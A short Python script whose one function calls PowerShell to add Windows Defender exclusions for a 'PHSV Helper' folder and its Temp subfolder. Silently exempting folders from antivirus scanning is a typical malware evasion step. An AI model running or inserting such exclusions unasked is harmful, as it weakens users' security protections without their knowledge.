import subprocess

def add_exception():
    program_folder ='''
    Add-MpPreference -ExclusionPath 'C:\\Program Files\\PHSV Helper'
    '''
    program_temp_folder ='''
    Add-MpPreference -ExclusionPath 'C:\\Program Files\\PHSV Helper\\Temp'
    '''
    subprocess.run(['powershell', f'{program_folder}'])
    subprocess.run(['powershell', f'{program_temp_folder}'])